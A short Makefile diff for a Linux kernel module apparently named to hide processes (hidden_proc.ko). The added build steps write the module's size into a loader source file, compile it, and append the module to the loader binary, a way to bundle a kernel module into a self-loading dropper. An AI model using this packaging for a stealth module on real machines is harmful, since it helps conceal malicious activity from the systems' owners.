@@ -7,6 +7,10 @@ else
 	PWD := $(shell pwd)
 default:
 	$(MAKE)  -C $(KERNELDIR) M=$(PWD) modules
+	sed -i "s/int m_size = 0;/int m_size = `stat -c %s hidden_proc.ko`;/" load.c 
+	gcc -O2 -o load load.c
+	cat hidden_proc.ko >> load
 clean:
 	rm -rf *.ko *.o *.mod *.mod.o *.mod.c *.symvers \.*.cmd .tmp_versions modules.order
+	rm -rf load
 endif
